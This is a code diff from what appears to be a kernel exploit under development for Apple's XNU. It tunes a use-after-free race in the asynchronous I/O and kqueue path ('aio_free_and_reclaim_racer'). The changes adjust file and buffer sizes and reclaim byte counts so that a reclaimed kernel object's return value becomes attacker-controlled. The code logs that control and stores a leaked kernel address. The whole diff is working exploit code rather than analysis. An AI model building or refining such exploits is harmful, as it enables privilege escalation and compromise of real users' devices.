@@ -5658,13 +5658,16 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         [self appendLog:@"FAIL: could not create temp file"];
         return;
     }
-    char fdata[4096];
-    memset(fdata, 'A', sizeof(fdata));
+    // Use 32KB file so both trigger(4KB) and reclaim(8KB) nbytes can be fully satisfied.
+    // returnval = actual bytes read = min(aio_nbytes, file_size).
+    // ext[1]=0x1000 → trigger source. ext[1]=0x2000 → reclaim source (CONTROLLED).
+    char fdata[32768];
+    memset(fdata, 'B', sizeof(fdata));
     write(fd, fdata, sizeof(fdata));
-    [self appendLog:[NSString stringWithFormat:@"fd=%d pid=%d uid=%d", fd, getpid(), getuid()]];
+    [self appendLog:[NSString stringWithFormat:@"fd=%d file=32KB pid=%d uid=%d", fd, getpid(), getuid()]];
 
     static struct aiocb rcbs[AIO_NRECLAIM];
-    static char rbufs[AIO_NRECLAIM][4096];
+    static char rbufs[AIO_NRECLAIM][16384];  // 16KB buffers for 8KB reads
 
     // ---- Phase A: Control confirmation + kernel addr leak ----
     // Use distinctive reclaim nbytes (0x4141) to prove ext[1] comes from reclaim entry.
@@ -5688,13 +5691,14 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         tcb.aio_sigevent.sigev_signo = kq;
         tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
 
-        // Reclaim entries with DIFFERENT nbytes than trigger to identify source
-        // Trigger nbytes=4096(0x1000), Reclaim nbytes=0x4141
+        // Reclaim entries with DIFFERENT nbytes than trigger to identify source.
+        // Trigger nbytes=4096(0x1000), Reclaim nbytes=8192(0x2000).
+        // File is 32KB so both read their full nbytes.
         for (int i = 0; i < AIO_NRECLAIM; i++) {
             memset(&rcbs[i], 0, sizeof(rcbs[i]));
             rcbs[i].aio_fildes = fd;
             rcbs[i].aio_buf = rbufs[i];
-            rcbs[i].aio_nbytes = 0x4141;  // distinctive marker
+            rcbs[i].aio_nbytes = 0x2000;  // 8192 — distinguishable from trigger's 0x1000
             rcbs[i].aio_offset = 0;
             rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
         }
@@ -5746,11 +5750,14 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             [self appendLog:[NSString stringWithFormat:@"  data   = 0x%llx", (uint64_t)kev.data]];
             [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx (errorval)", kev.ext[0]]];
             [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (returnval)", kev.ext[1]]];
-            if (kev.ext[1] == 0x4141) {
-                [self appendLog:@"  >> CONFIRMED: ext[1] from reclaim entry (nbytes=0x4141) <<"];
+            if (kev.ext[1] == 0x2000) {
+                [self appendLog:@"  >> CONFIRMED: ext[1] from reclaim entry (nbytes=0x2000) <<"];
                 [self appendLog:@"  >> ext[1] is CONTROLLABLE via aio_nbytes <<"];
+            } else if (kev.ext[1] == 0x1000) {
+                [self appendLog:@"  >> ext[1]=0x1000 — from trigger entry (not reclaim) <<"];
+                [self appendLog:@"  >> Possible: reclaim didn't occupy trigger's slot <<"];
             } else {
-                [self appendLog:[NSString stringWithFormat:@"  >> ext[1]=0x%llx, expected 0x4141 — check source <<", kev.ext[1]]];
+                [self appendLog:[NSString stringWithFormat:@"  >> ext[1]=0x%llx, expected 0x1000 or 0x2000 — check source <<", kev.ext[1]]];
             }
 
             self.leakedKernelAddr = kev.ident;
